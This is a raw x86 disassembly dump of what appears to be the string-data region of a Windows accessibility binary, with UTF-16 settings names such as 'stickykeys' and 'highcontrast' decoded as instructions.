  4016cb:	add    BYTE PTR [ebp+0x0],ah
  4016ce:	jb     0x4016d0
  4016d0:	jae    0x4016d2
  4016d2:	imul   eax,DWORD PTR [eax],0x6e006f
  4016d8:	pop    esp
  4016d9:	add    BYTE PTR [ecx+0x0],al
  4016dc:	arpl   WORD PTR [eax],ax
  4016de:	arpl   WORD PTR [eax],ax
  4016e0:	add    BYTE PTR gs:[ebx+0x0],dh
  4016e4:	jae    0x4016e6
  4016e6:	imul   eax,DWORD PTR [eax],0x690062
  4016ec:	ins    BYTE PTR es:[edi],dx
  4016ed:	add    BYTE PTR [ecx+0x0],ch
  4016f0:	je     0x4016f2
  4016f2:	jns    0x4016f4
  4016f4:	pop    esp
  4016f5:	add    BYTE PTR [ebx+0x0],dl
  4016f8:	add    BYTE PTR gs:[ebx+0x0],dh
  4016fc:	jae    0x4016fe
  4016fe:	imul   eax,DWORD PTR [eax],0x6e006f
  401704:	add    BYTE PTR [eax],al
  401706:	add    BYTE PTR [eax],al
  401708:	push   ebx
  401709:	add    BYTE PTR [eax+eax*1+0x61],dh
  40170d:	add    BYTE PTR [edx+0x0],dh
  401710:	je     0x401712
  401712:	dec    esp
  401713:	add    BYTE PTR [ecx+0x0],ch
  401716:	jae    0x401718
  401718:	je     0x40171a
  40171a:	cmp    al,BYTE PTR [eax]
  40171c:	cmp    al,BYTE PTR [eax]
  40171e:	dec    ecx
  40171f:	add    BYTE PTR [ebx+0x0],dh
  401722:	inc    esp
  401723:	add    BYTE PTR [ebp+0x0],ah
  401726:	jae    0x401728
  401728:	imul   eax,DWORD PTR [eax],0x74
  40172b:	add    BYTE PTR [edi+0x0],ch
  40172e:	jo     0x401730
  401730:	push   ebx
  401731:	add    BYTE PTR [edi+0x0],dh
  401734:	imul   eax,DWORD PTR [eax],0x630074
  40173a:	push   0x0
  40173f:	add    BYTE PTR [eax+eax*1+0x0],bl
  401743:	add    BYTE PTR [ebx+0x0],al
  401746:	outs   dx,DWORD PTR ds:[esi]
  401747:	add    BYTE PTR [esi+0x0],ch
  40174a:	data16 add BYTE PTR [ecx+0x0],ch
  40174e:	add    BYTE PTR [di+0x0],dh
  401752:	jb     0x401754
  401754:	popa   
  401755:	add    BYTE PTR [eax+eax*1+0x69],dh
  401759:	add    BYTE PTR [edi+0x0],ch
  40175c:	outs   dx,BYTE PTR ds:[esi]
  40175d:	add    BYTE PTR [eax],al
  40175f:	add    BYTE PTR [ebx+0x0],dl
  401762:	outs   dx,DWORD PTR ds:[esi]
  401763:	add    BYTE PTR [esi+0x0],ah
  401766:	je     0x401768
  401768:	ja     0x40176a
  40176a:	popa   
  40176b:	add    BYTE PTR [edx+0x0],dh
  40176e:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401773:	add    BYTE PTR [ecx+0x0],ch
  401776:	arpl   WORD PTR [eax],ax
  401778:	jb     0x40177a
  40177a:	outs   dx,DWORD PTR ds:[esi]
  40177b:	add    BYTE PTR [ebx+0x0],dh
  40177e:	outs   dx,DWORD PTR ds:[esi]
  40177f:	add    BYTE PTR [esi+0x0],ah
  401782:	je     0x401784
  401784:	pop    esp
  401785:	add    BYTE PTR [edi+0x0],dl
  401788:	imul   eax,DWORD PTR [eax],0x64006e
  40178e:	outs   dx,DWORD PTR ds:[esi]
  40178f:	add    BYTE PTR [edi+0x0],dh
  401792:	jae    0x401794
  401794:	pop    esp
  401795:	add    BYTE PTR [ebx+0x0],al
  401798:	jne    0x40179a
  40179a:	jb     0x40179c
  40179c:	jb     0x40179e
  40179e:	add    BYTE PTR gs:[esi+0x0],ch
  4017a2:	je     0x4017a4
  4017a4:	push   esi
  4017a5:	add    BYTE PTR [ebp+0x0],ah
  4017a8:	jb     0x4017aa
  4017aa:	jae    0x4017ac
  4017ac:	imul   eax,DWORD PTR [eax],0x6e006f
  4017b2:	pop    esp
  4017b3:	add    BYTE PTR [ebp+0x0],al
  4017b6:	js     0x4017b8
  4017b8:	jo     0x4017ba
  4017ba:	ins    BYTE PTR es:[edi],dx
  4017bb:	add    BYTE PTR [edi+0x0],ch
  4017be:	jb     0x4017c0
  4017c0:	add    BYTE PTR gs:[edx+0x0],dh
  4017c4:	pop    esp
  4017c5:	add    BYTE PTR [ebx+0x0],dl
  4017c8:	push   0x6c006500
  4017cd:	add    BYTE PTR [eax+eax*1+0x20],ch
  4017d1:	add    BYTE PTR [esi+0x0],al
  4017d4:	outs   dx,DWORD PTR ds:[esi]
  4017d5:	add    BYTE PTR [eax+eax*1+0x64],ch
  4017d9:	add    BYTE PTR [ebp+0x0],ah
  4017dc:	jb     0x4017de
  4017de:	jae    0x4017e0
  4017e0:	add    BYTE PTR [eax],al
  4017e2:	add    BYTE PTR [eax],al
  4017e4:	push   ebx
  4017e5:	add    BYTE PTR [eax+eax*1+0x61],dh
  4017e9:	add    BYTE PTR [edx+0x0],dh
  4017ec:	je     0x4017ee
  4017ee:	jne    0x4017f0
  4017f0:	jo     0x4017f2
  4017f2:	add    BYTE PTR [eax],al
  4017f4:	pop    esp
  4017f5:	add    BYTE PTR [edi+0x0],cl
  4017f8:	outs   dx,BYTE PTR ds:[esi]
  4017f9:	add    BYTE PTR ds:0x63005300,ch
  4017ff:	add    BYTE PTR [edx+0x0],dh
  401802:	add    BYTE PTR gs:[ebp+0x0],ah
  401806:	outs   dx,BYTE PTR ds:[esi]
  401807:	add    BYTE PTR [eax],ah
  401809:	add    BYTE PTR [ebx+0x0],cl
  40180c:	add    BYTE PTR gs:[ecx+0x0],bh
  401810:	bound  eax,QWORD PTR [eax]
  401812:	outs   dx,DWORD PTR ds:[esi]
  401813:	add    BYTE PTR [ecx+0x0],ah
  401816:	jb     0x401818
  401818:	add    BYTE PTR fs:[esi],ch
  40181b:	add    BYTE PTR [eax+eax*1+0x6e],ch
  40181f:	add    BYTE PTR [ebx+0x0],ch
  401822:	add    BYTE PTR [eax],al
  401824:	pop    esp
  401825:	add    BYTE PTR [esi+0x0],cl
  401828:	popa   
  401829:	add    BYTE PTR [edx+0x0],dh
  40182c:	jb     0x40182e
  40182e:	popa   
  40182f:	add    BYTE PTR [eax+eax*1+0x6f],dh
  401833:	add    BYTE PTR [edx+0x0],dh
  401836:	add    BYTE PTR cs:[eax+eax*1+0x6e],ch
  40183b:	add    BYTE PTR [ebx+0x0],ch
  40183e:	add    BYTE PTR [eax],al
  401840:	pop    esp
  401841:	add    BYTE PTR [ebp+0x0],cl
  401844:	popa   
  401845:	add    BYTE PTR [edi+0x0],ah
  401848:	outs   dx,BYTE PTR ds:[esi]
  401849:	add    BYTE PTR [ecx+0x0],ch
  40184c:	data16 add BYTE PTR [ecx+0x0],ch
  401850:	add    BYTE PTR gs:[edx+0x0],dh
  401854:	add    BYTE PTR cs:[eax+eax*1+0x6e],ch
  401859:	add    BYTE PTR [ebx+0x0],ch
  40185c:	add    BYTE PTR [eax],al
  40185e:	add    BYTE PTR [eax],al
  401860:	sub    al,0x0
  401862:	outs   dx,DWORD PTR ds:[esi]
  401863:	add    BYTE PTR [ebx+0x0],dh
  401866:	imul   eax,DWORD PTR [eax],0x0
  401869:	add    BYTE PTR [eax],al
  40186b:	add    BYTE PTR [eax],al
  40186d:	add    BYTE PTR [eax],al
  40186f:	add    BYTE PTR [eax+eax*1],ch
  401872:	dec    esi
  401873:	add    BYTE PTR [ecx+0x0],ah
  401876:	jb     0x401878
  401878:	jb     0x40187a
  40187a:	popa   
  40187b:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40187f:	add    BYTE PTR [edx+0x0],dh
	...
  40188e:	add    BYTE PTR [eax],al
  401890:	sub    al,0x0
  401892:	ins    DWORD PTR es:[edi],dx
  401893:	add    BYTE PTR [ecx+0x0],ah
  401896:	add    BYTE PTR [bp+0x0],ch
  40189a:	imul   eax,DWORD PTR [eax],0x690066
  4018a0:	add    BYTE PTR gs:[edx+0x0],dh
  4018a4:	jo     0x4018a6
  4018a6:	popa   
  4018a7:	add    BYTE PTR [esi+0x0],ch
  4018aa:	add    BYTE PTR gs:[eax],al
  4018ad:	add    BYTE PTR [eax],al
  4018af:	add    BYTE PTR [eax],al
  4018b1:	add    BYTE PTR [eax],al
  4018b3:	add    BYTE PTR [eax],bl
  4018b5:	mov    ds:0xf659afb0,al
  4018ba:	or     eax,0x1451e422
  4018bf:	xchg   ecx,eax
  4018c0:	xor    esi,0x15
  4018c3:	jnp    0x4018f4
  4018c5:	add    BYTE PTR [eax+0x0],ch
  4018c8:	popa   
  4018c9:	add    BYTE PTR [edx+0x0],dh
  4018cc:	add    BYTE PTR fs:[edi+0x0],dh
  4018d0:	popa   
  4018d1:	add    BYTE PTR [edx+0x0],dh
  4018d4:	add    BYTE PTR gs:[edx+0x0],ah
  4018d8:	jne    0x4018da
  4018da:	je     0x4018dc
  4018dc:	je     0x4018de
  4018de:	outs   dx,DWORD PTR ds:[esi]
  4018df:	add    BYTE PTR [esi+0x0],ch
  4018e2:	ins    BYTE PTR es:[edi],dx
  4018e3:	add    BYTE PTR [ecx+0x0],ah
  4018e6:	jne    0x4018e8
  4018e8:	outs   dx,BYTE PTR ds:[esi]
  4018e9:	add    BYTE PTR [ebx+0x0],ah
  4018ec:	push   0x53000000
  4018f1:	add    BYTE PTR [edi+0x0],ch
  4018f4:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  4018f9:	add    BYTE PTR [ecx+0x0],ah
  4018fc:	jb     0x4018fe
  4018fe:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401903:	add    BYTE PTR [ecx+0x0],ch
  401906:	arpl   WORD PTR [eax],ax
  401908:	jb     0x40190a
  40190a:	outs   dx,DWORD PTR ds:[esi]
  40190b:	add    BYTE PTR [ebx+0x0],dh
  40190e:	outs   dx,DWORD PTR ds:[esi]
  40190f:	add    BYTE PTR [esi+0x0],ah
  401912:	je     0x401914
  401914:	pop    esp
  401915:	add    BYTE PTR [edi+0x0],dl
  401918:	imul   eax,DWORD PTR [eax],0x64006e
  40191e:	outs   dx,DWORD PTR ds:[esi]
  40191f:	add    BYTE PTR [edi+0x0],dh
  401922:	jae    0x401924
  401924:	and    BYTE PTR [eax],al
  401926:	dec    esi
  401927:	add    BYTE PTR [eax+eax*1+0x5c],dl
  40192b:	add    BYTE PTR [ebx+0x0],al
  40192e:	jne    0x401930
  401930:	jb     0x401932
  401932:	jb     0x401934
  401934:	add    BYTE PTR gs:[esi+0x0],ch
  401938:	je     0x40193a
  40193a:	push   esi
  40193b:	add    BYTE PTR [ebp+0x0],ah
  40193e:	jb     0x401940
  401940:	jae    0x401942
  401942:	imul   eax,DWORD PTR [eax],0x6e006f
  401948:	pop    esp
  401949:	add    BYTE PTR [ecx+0x0],al
  40194c:	arpl   WORD PTR [eax],ax
  40194e:	arpl   WORD PTR [eax],ax
  401950:	add    BYTE PTR gs:[ebx+0x0],dh
  401954:	jae    0x401956
  401956:	imul   eax,DWORD PTR [eax],0x690062
  40195c:	ins    BYTE PTR es:[edi],dx
  40195d:	add    BYTE PTR [ecx+0x0],ch
  401960:	je     0x401962
  401962:	jns    0x401964
  401964:	push   esp
  401965:	add    BYTE PTR [ebp+0x0],ah
  401968:	ins    DWORD PTR es:[edi],dx
  401969:	add    BYTE PTR [eax+0x0],dh
  40196c:	add    BYTE PTR [eax],al
  40196e:	add    BYTE PTR [eax],al
  401970:	push   ebx
  401971:	add    BYTE PTR [edi+0x0],ch
  401974:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401979:	add    BYTE PTR [ecx+0x0],ah
  40197c:	jb     0x40197e
  40197e:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401983:	add    BYTE PTR [ecx+0x0],ch
  401986:	arpl   WORD PTR [eax],ax
  401988:	jb     0x40198a
  40198a:	outs   dx,DWORD PTR ds:[esi]
  40198b:	add    BYTE PTR [ebx+0x0],dh
  40198e:	outs   dx,DWORD PTR ds:[esi]
  40198f:	add    BYTE PTR [esi+0x0],ah
  401992:	je     0x401994
  401994:	pop    esp
  401995:	add    BYTE PTR [edi+0x0],dl
  401998:	imul   eax,DWORD PTR [eax],0x64006e
  40199e:	outs   dx,DWORD PTR ds:[esi]
  40199f:	add    BYTE PTR [edi+0x0],dh
  4019a2:	jae    0x4019a4
  4019a4:	and    BYTE PTR [eax],al
  4019a6:	dec    esi
  4019a7:	add    BYTE PTR [eax+eax*1+0x5c],dl
  4019ab:	add    BYTE PTR [ebx+0x0],al
  4019ae:	jne    0x4019b0
  4019b0:	jb     0x4019b2
  4019b2:	jb     0x4019b4
  4019b4:	add    BYTE PTR gs:[esi+0x0],ch
  4019b8:	je     0x4019ba
  4019ba:	push   esi
  4019bb:	add    BYTE PTR [ebp+0x0],ah
  4019be:	jb     0x4019c0
  4019c0:	jae    0x4019c2
  4019c2:	imul   eax,DWORD PTR [eax],0x6e006f
  4019c8:	pop    esp
  4019c9:	add    BYTE PTR [ecx+0x0],al
  4019cc:	arpl   WORD PTR [eax],ax
  4019ce:	arpl   WORD PTR [eax],ax
  4019d0:	add    BYTE PTR gs:[ebx+0x0],dh
  4019d4:	jae    0x4019d6
  4019d6:	imul   eax,DWORD PTR [eax],0x690062
  4019dc:	ins    BYTE PTR es:[edi],dx
  4019dd:	add    BYTE PTR [ecx+0x0],ch
  4019e0:	je     0x4019e2
  4019e2:	jns    0x4019e4
  4019e4:	pop    esp
  4019e5:	add    BYTE PTR [ecx+0x0],al
  4019e8:	push   esp
  4019e9:	add    BYTE PTR [ebx+0x0],dh
  4019ec:	add    BYTE PTR [eax],al
  4019ee:	add    BYTE PTR [eax],al
  4019f0:	inc    ecx
  4019f1:	add    BYTE PTR [eax+eax*1+0x42],dl
  4019f5:	add    BYTE PTR [edx+0x0],dh
  4019f8:	outs   dx,DWORD PTR ds:[esi]
  4019f9:	add    BYTE PTR [ebx+0x0],ch
  4019fc:	add    BYTE PTR gs:[edx+0x0],dh
  401a00:	add    BYTE PTR cs:[ebp+0x0],ah
  401a04:	js     0x401a06
  401a06:	add    BYTE PTR gs:[eax],al
  401a09:	add    BYTE PTR [eax],al
  401a0b:	add    BYTE PTR ds:0x20007300,ah
  401a11:	add    BYTE PTR [edi],ch
  401a13:	add    BYTE PTR [ebx+0x0],ah
  401a16:	outs   dx,DWORD PTR ds:[esi]
  401a17:	add    BYTE PTR [eax+0x0],dh
  401a1a:	jns    0x401a1c
  401a1c:	add    BYTE PTR [eax],al
  401a1e:	add    BYTE PTR [eax],al
  401a20:	data16 add BYTE PTR [ecx+0x0],ch
  401a24:	ins    BYTE PTR es:[edi],dx
  401a25:	add    BYTE PTR [eax+eax*1+0x65],dh
  401a29:	add    BYTE PTR [edx+0x0],dh
  401a2c:	imul   eax,DWORD PTR [eax],0x65
  401a2f:	add    BYTE PTR [ecx+0x0],bh
  401a32:	jae    0x401a34
  401a34:	add    BYTE PTR [eax],al
  401a36:	add    BYTE PTR [eax],al
  401a38:	push   0x67006900
  401a3d:	add    BYTE PTR [eax+0x0],ch
  401a40:	arpl   WORD PTR [eax],ax
  401a42:	outs   dx,DWORD PTR ds:[esi]
  401a43:	add    BYTE PTR [esi+0x0],ch
  401a46:	je     0x401a48
  401a48:	jb     0x401a4a
  401a4a:	popa   
  401a4b:	add    BYTE PTR [ebx+0x0],dh
  401a4e:	je     0x401a50
  401a50:	add    BYTE PTR [eax],al
  401a52:	add    BYTE PTR [eax],al
  401a54:	ins    DWORD PTR es:[edi],dx
  401a55:	add    BYTE PTR [edi+0x0],ch
  401a58:	jne    0x401a5a
  401a5a:	jae    0x401a5c
  401a5c:	add    BYTE PTR gs:[ebx+0x0],ch
  401a60:	add    BYTE PTR gs:[ecx+0x0],bh
  401a64:	jae    0x401a66
  401a66:	add    BYTE PTR [eax],al
  401a68:	jae    0x401a6a
  401a6a:	outs   dx,DWORD PTR ds:[esi]
  401a6b:	add    BYTE PTR [ebp+0x0],dh
  401a6e:	outs   dx,BYTE PTR ds:[esi]
  401a6f:	add    BYTE PTR [eax+eax*1+0x73],ah
  401a73:	add    BYTE PTR [ebp+0x0],ah
  401a76:	outs   dx,BYTE PTR ds:[esi]
  401a77:	add    BYTE PTR [eax+eax*1+0x72],dh
  401a7b:	add    BYTE PTR [ecx+0x0],bh
  401a7e:	add    BYTE PTR [eax],al
  401a80:	jae    0x401a82
  401a82:	je     0x401a84
  401a84:	imul   eax,DWORD PTR [eax],0x6b0063
  401a8a:	jns    0x401a8c
  401a8c:	imul   eax,DWORD PTR [eax],0x65
  401a8f:	add    BYTE PTR [ecx+0x0],bh
  401a92:	jae    0x401a94
  401a94:	add    BYTE PTR [eax],al
  401a96:	add    BYTE PTR [eax],al
  401a98:	je     0x401a9a
  401a9a:	outs   dx,DWORD PTR ds:[esi]
  401a9b:	add    BYTE PTR [edi+0x0],ah
  401a9e:	add    BYTE PTR [si+0x0],ch
  401aa2:	add    BYTE PTR gs:[ebx+0x0],ch
  401aa6:	add    BYTE PTR gs:[ecx+0x0],bh
  401aaa:	jae    0x401aac
  401aac:	add    BYTE PTR [eax],al
  401aae:	add    BYTE PTR [eax],al
  401ab0:	data16 add BYTE PTR [edi+0x0],ch
  401ab4:	arpl   WORD PTR [eax],ax
  401ab6:	jne    0x401ab8
  401ab8:	jae    0x401aba
  401aba:	bound  eax,QWORD PTR [eax]
  401abc:	outs   dx,DWORD PTR ds:[esi]
  401abd:	add    BYTE PTR [edx+0x0],dh
  401ac0:	add    BYTE PTR fs:[ebp+0x0],ah
  401ac4:	jb     0x401ac6
  401ac6:	push   0x69006500
  401acb:	add    BYTE PTR [edi+0x0],ah
  401ace:	push   0x7400
  401ad3:	add    BYTE PTR [esi+0x0],ah
  401ad6:	outs   dx,DWORD PTR ds:[esi]
  401ad7:	add    BYTE PTR [ebx+0x0],ah
  401ada:	jne    0x401adc
  401adc:	jae    0x401ade
  401ade:	bound  eax,QWORD PTR [eax]
  401ae0:	outs   dx,DWORD PTR ds:[esi]
  401ae1:	add    BYTE PTR [edx+0x0],dh
  401ae4:	add    BYTE PTR fs:[ebp+0x0],ah
  401ae8:	jb     0x401aea
  401aea:	ja     0x401aec
  401aec:	imul   eax,DWORD PTR [eax],0x740064
  401af2:	push   0x0
  401af7:	add    BYTE PTR [ebx+0x0],ah
  401afa:	popa   
  401afb:	add    BYTE PTR [edx+0x0],dh
  401afe:	add    BYTE PTR gs:[eax+eax*1+0x77],dh
  401b03:	add    BYTE PTR [ecx+0x0],ch
  401b06:	add    BYTE PTR fs:[eax+eax*1+0x68],dh
  401b0b:	add    BYTE PTR [eax],al
  401b0d:	add    BYTE PTR [eax],al
  401b0f:	add    BYTE PTR [ebx+0x0],ch
  401b12:	add    BYTE PTR gs:[ecx+0x0],bh
  401b16:	bound  eax,QWORD PTR [eax]
  401b18:	outs   dx,DWORD PTR ds:[esi]
  401b19:	add    BYTE PTR [ecx+0x0],ah
  401b1c:	jb     0x401b1e
  401b1e:	add    BYTE PTR fs:[ebx+0x0],ah
  401b22:	jne    0x401b24
  401b24:	add    BYTE PTR gs:[ebx+0x0],dh
  401b28:	add    BYTE PTR [eax],al
  401b2a:	add    BYTE PTR [eax],al
  401b2c:	imul   eax,DWORD PTR [eax],0x65
  401b2f:	add    BYTE PTR [ecx+0x0],bh
  401b32:	bound  eax,QWORD PTR [eax]
  401b34:	outs   dx,DWORD PTR ds:[esi]
  401b35:	add    BYTE PTR [ecx+0x0],ah
  401b38:	jb     0x401b3a
  401b3a:	add    BYTE PTR fs:[eax+0x0],dh
  401b3e:	jb     0x401b40
  401b40:	add    BYTE PTR gs:[esi+0x0],ah
  401b44:	add    BYTE PTR [eax],al
  401b46:	add    BYTE PTR [eax],al
  401b48:	outs   dx,DWORD PTR ds:[esi]
  401b49:	add    BYTE PTR [esi+0x0],dh
  401b4c:	add    BYTE PTR gs:[edx+0x0],dh
  401b50:	ins    BYTE PTR es:[edi],dx
  401b51:	add    BYTE PTR [ecx+0x0],ah
  401b54:	jo     0x401b56
  401b56:	jo     0x401b58
  401b58:	add    BYTE PTR gs:[eax+eax*1+0x63],ah
  401b5d:	add    BYTE PTR [edi+0x0],ch
  401b60:	outs   dx,BYTE PTR ds:[esi]
  401b61:	add    BYTE PTR [eax+eax*1+0x65],dh
  401b65:	add    BYTE PTR [esi+0x0],ch
  401b68:	je     0x401b6a
  401b6a:	add    BYTE PTR [eax],al
  401b6c:	popa   
  401b6d:	add    BYTE PTR [ebp+0x0],dh
  401b70:	add    BYTE PTR fs:[ecx+0x0],ch
  401b74:	outs   dx,DWORD PTR ds:[esi]
  401b75:	add    BYTE PTR [eax+eax*1+0x65],ah
  401b79:	add    BYTE PTR [ebx+0x0],dh
  401b7c:	arpl   WORD PTR [eax],ax
  401b7e:	jb     0x401b80
  401b80:	imul   eax,DWORD PTR [eax],0x740070
  401b86:	imul   eax,DWORD PTR [eax],0x6e006f
  401b8c:	add    BYTE PTR [eax],al
  401b8e:	add    BYTE PTR [eax],al
  401b90:	popa   
  401b91:	add    BYTE PTR [esi+0x0],ch
  401b94:	imul   eax,DWORD PTR [eax],0x61006d
  401b9a:	je     0x401b9c
  401b9c:	imul   eax,DWORD PTR [eax],0x6e006f
  401ba2:	jae    0x401ba4
  401ba4:	add    BYTE PTR [eax],al
  401ba6:	add    BYTE PTR [eax],al
  401ba8:	ja     0x401baa
  401baa:	imul   eax,DWORD PTR [eax],0x64006e
  401bb0:	outs   dx,DWORD PTR ds:[esi]
  401bb1:	add    BYTE PTR [edi+0x0],dh
  401bb4:	je     0x401bb6
  401bb6:	jb     0x401bb8
  401bb8:	popa   
  401bb9:	add    BYTE PTR [ebx+0x0],ah
  401bbc:	imul   eax,DWORD PTR [eax],0x69
  401bbf:	add    BYTE PTR [esi+0x0],ch
  401bc2:	add    BYTE PTR [bx+si],al
  401bc5:	add    BYTE PTR [eax],al
  401bc7:	add    BYTE PTR [edi+0x0],dh
  401bca:	imul   eax,DWORD PTR [eax],0x64006e
  401bd0:	outs   dx,DWORD PTR ds:[esi]
  401bd1:	add    BYTE PTR [edi+0x0],dh
  401bd4:	je     0x401bd6
  401bd6:	jb     0x401bd8
  401bd8:	popa   
  401bd9:	add    BYTE PTR [ebx+0x0],ah
  401bdc:	imul   eax,DWORD PTR [eax],0x69
  401bdf:	add    BYTE PTR [esi+0x0],ch
  401be2:	add    BYTE PTR [bp+si+0x0],bh
  401be6:	outs   dx,DWORD PTR ds:[esi]
  401be7:	add    BYTE PTR [edx+0x0],dh
  401bea:	add    BYTE PTR fs:[ebp+0x0],ah
  401bee:	jb     0x401bf0
  401bf0:	add    BYTE PTR [eax],al
  401bf2:	add    BYTE PTR [eax],al
  401bf4:	ja     0x401bf6
  401bf6:	imul   eax,DWORD PTR [eax],0x64006e
  401bfc:	outs   dx,DWORD PTR ds:[esi]
  401bfd:	add    BYTE PTR [edi+0x0],dh
  401c00:	je     0x401c02
  401c02:	jb     0x401c04
  401c04:	popa   
  401c05:	add    BYTE PTR [ebx+0x0],ah
  401c08:	imul   eax,DWORD PTR [eax],0x69
  401c0b:	add    BYTE PTR [esi+0x0],ch
  401c0e:	add    BYTE PTR [si+0x0],dh
  401c12:	imul   eax,DWORD PTR [eax],0x65006d
  401c18:	outs   dx,DWORD PTR ds:[esi]
  401c19:	add    BYTE PTR [ebp+0x0],dh
  401c1c:	je     0x401c1e
  401c1e:	add    BYTE PTR [eax],al
  401c20:	ins    DWORD PTR es:[edi],dx
  401c21:	add    BYTE PTR [ebp+0x0],ah
  401c24:	jae    0x401c26
  401c26:	jae    0x401c28
  401c28:	popa   
  401c29:	add    BYTE PTR [edi+0x0],ah
  401c2c:	add    BYTE PTR gs:[eax+eax*1+0x75],ah
  401c31:	add    BYTE PTR [edx+0x0],dh
  401c34:	popa   
  401c35:	add    BYTE PTR [eax+eax*1+0x69],dh
  401c39:	add    BYTE PTR [edi+0x0],ch
  401c3c:	outs   dx,BYTE PTR ds:[esi]
  401c3d:	add    BYTE PTR [eax],al
  401c3f:	add    BYTE PTR [ebp+0x0],ch
  401c42:	imul   eax,DWORD PTR [eax],0x69006e
  401c48:	ins    DWORD PTR es:[edi],dx
  401c49:	add    BYTE PTR [ebp+0x0],dh
  401c4c:	ins    DWORD PTR es:[edi],dx
  401c4d:	add    BYTE PTR [eax+0x0],ch
  401c50:	imul   eax,DWORD PTR [eax],0x720074
  401c56:	popa   
  401c57:	add    BYTE PTR [eax+eax*1+0x69],ah
  401c5b:	add    BYTE PTR [ebp+0x0],dh
  401c5e:	jae    0x401c60
  401c60:	add    BYTE PTR [eax],al
  401c62:	add    BYTE PTR [eax],al
  401c64:	jae    0x401c66
  401c66:	push   0x77006f00
  401c6b:	add    BYTE PTR [ebx+0x0],dh
  401c6e:	outs   dx,DWORD PTR ds:[esi]
  401c6f:	add    BYTE PTR [ebp+0x0],dh
  401c72:	outs   dx,BYTE PTR ds:[esi]
  401c73:	add    BYTE PTR [eax+eax*1+0x73],ah
  401c77:	add    BYTE PTR [eax],al
  401c79:	add    BYTE PTR [eax],al
  401c7b:	add    BYTE PTR [edi+0x0],dh
  401c7e:	imul   eax,DWORD PTR [eax],0x64006e
  401c84:	outs   dx,DWORD PTR ds:[esi]
  401c85:	add    BYTE PTR [edi+0x0],dh
  401c88:	popa   
  401c89:	add    BYTE PTR [edx+0x0],dh
  401c8c:	jb     0x401c8e
  401c8e:	popa   
  401c8f:	add    BYTE PTR [esi+0x0],ch
  401c92:	add    BYTE PTR [bx+di+0x0],ch
  401c96:	outs   dx,BYTE PTR ds:[esi]
  401c97:	add    BYTE PTR [edi+0x0],ah
  401c9a:	add    BYTE PTR [eax],al
  401c9c:	arpl   WORD PTR [eax],ax
  401c9e:	popa   
  401c9f:	add    BYTE PTR [edx+0x0],dh
  401ca2:	add    BYTE PTR gs:[eax+eax*1+0x62],dh
  401ca7:	add    BYTE PTR [edx+0x0],dh
  401caa:	outs   dx,DWORD PTR ds:[esi]
  401cab:	add    BYTE PTR [edi+0x0],dh
  401cae:	jae    0x401cb0
  401cb0:	imul   eax,DWORD PTR [eax],0x67006e
  401cb6:	add    BYTE PTR [eax],al
  401cb8:	push   edi
  401cb9:	add    BYTE PTR [ecx+0x0],ch
  401cbc:	outs   dx,BYTE PTR ds:[esi]
  401cbd:	add    BYTE PTR [eax+eax*1+0x6f],ch
  401cc1:	add    BYTE PTR [edi+0x0],ah
  401cc4:	outs   dx,DWORD PTR ds:[esi]
  401cc5:	add    BYTE PTR [esi+0x0],ch
  401cc8:	inc    ecx
  401cc9:	add    BYTE PTR [ebx+0x0],ah
  401ccc:	arpl   WORD PTR [eax],ax
  401cce:	add    BYTE PTR gs:[ebx+0x0],dh
  401cd2:	jae    0x401cd4
  401cd4:	add    BYTE PTR [eax],al
  401cd6:	add    BYTE PTR [eax],al
  401cd8:	loopne 0x401d17
  401cda:	dec    esp
  401cdb:	cmp    DWORD PTR [edi+0x3c],ebp
  401cde:	rcl    BYTE PTR [ecx],cl
  401ce0:	cmp    DWORD PTR [ebx+0x0],0x7a794fc0
  401ce7:	mov    bh,0x0
	...
  401cf1:	add    BYTE PTR [eax],al
  401cf3:	add    BYTE PTR [ebp+edi*1+0x559f],bh
  401cfa:	add    BYTE PTR [eax],al
  401cfc:	add    al,BYTE PTR [eax]
  401cfe:	add    BYTE PTR [eax],al
  401d00:	and    eax,0x18000000
  401d05:	push   ds
  401d06:	add    BYTE PTR [eax],al
  401d08:	sbb    BYTE PTR [edx],dl
  401d0a:	add    BYTE PTR [eax],al
  401d0c:	add    BYTE PTR [eax],al
  401d0e:	add    BYTE PTR [eax],al
  401d10:	mov    esp,0x559f3d
  401d15:	add    BYTE PTR [eax],al
  401d17:	add    BYTE PTR ds:0x24000000,cl
  401d1d:	add    al,BYTE PTR [eax]
  401d1f:	add    BYTE PTR [esi+ebx*1+0x0],dl
  401d23:	add    BYTE PTR [edx+edx*1+0x0],dl
	...
  401d47:	add    BYTE PTR [eax+0x0],ch
	...
  401d82:	add    BYTE PTR [eax],al
  401d84:	add    al,0x90
  401d86:	inc    eax
  401d87:	add    BYTE PTR [eax+0x1a00401d],dh
  401d8d:	add    BYTE PTR [eax],al
  401d8f:	add    BYTE PTR [edx+eiz*4],cl
  401d92:	inc    eax
  401d93:	add    BYTE PTR [eax],al
  401d95:	add    BYTE PTR [eax],al
  401d97:	add    BYTE PTR [eax+edx*1],ch
  401d9a:	inc    eax
  401d9b:	add    BYTE PTR [esi],bl
  401d9d:	add    BYTE PTR [eax],al
  401d9f:	add    BYTE PTR [eax],al
  401da1:	xor    eax,0x0
	...
  401dae:	add    BYTE PTR [eax],al
  401db0:	nop
  401db1:	jl     0x401db3
  401db3:	add    BYTE PTR [edx],dh
  401db5:	add    BYTE PTR [eax],0x0
  401db8:	mov    dl,0x80
  401dba:	add    BYTE PTR [eax],al
  401dbc:	rol    BYTE PTR [eax-0x7ef10000],cl
  401dc2:	add    BYTE PTR [eax],al
  401dc4:	inc    ebp
  401dc5:	add    DWORD PTR [eax],0x81bf00
  401dcb:	add    BYTE PTR ds:0x6d000082,ch
  401dd1:	add    BYTE PTR [eax],0x0
  401dd4:	mov    ds:0xe0000082,eax
  401dd9:	add    BYTE PTR [eax],0x0
  401ddc:	sbb    DWORD PTR [ebx-0x7c8d0000],eax
  401de2:	add    BYTE PTR [eax],al
  401de4:	fwait
  401de5:	add    DWORD PTR [eax],0x0
  401de8:	mov    BYTE PTR [ebx-0x7beb0000],0x0
  401def:	add    BYTE PTR [edx-0x7c],cl
  401df2:	add    BYTE PTR [eax],al
  401df4:	jb     0x401d7a
  401df6:	add    BYTE PTR [eax],al
  401df8:	mov    ds:0xc7000084,al
  401dfd:	test   BYTE PTR [eax],al
  401dff:	add    dl,dh
  401e01:	test   BYTE PTR [eax],al
